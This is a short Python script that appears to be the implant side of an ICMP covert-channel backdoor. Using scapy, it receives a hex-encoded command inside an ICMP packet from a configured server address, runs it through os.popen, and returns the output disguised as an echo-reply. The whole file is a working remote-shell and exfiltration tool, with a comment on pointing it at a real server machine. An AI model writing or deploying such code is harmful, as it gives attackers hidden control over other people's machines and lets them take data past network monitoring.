#!/usr/bin/env python3

# Client should be on the host machine

from scapy.all import *
import binascii

server = "127.0.0.1"

def send_cmd(cmd):
	hex_cmd = binascii.hexlify(cmd.encode("utf8"))
	packet = IP(dst=server)/ICMP(type="echo-reply", id=0x6341, seq=0x1)/hex_cmd
	send(packet, verbose=0)
	print("[+] Packet sent")

def recv_cmd():
	# cahnge 127.0.0.1 to the ip of the server machine
	recv = sniff(filter="host " + server +" and icmp", count=1, iface="lo")
	print("[+] Packet received")
	data = recv[0][Raw].load.decode('utf-8')
	cmd = binascii.unhexlify(data).decode("utf8")
	return cmd

out = os.popen(recv_cmd()).read()

send_cmd(out)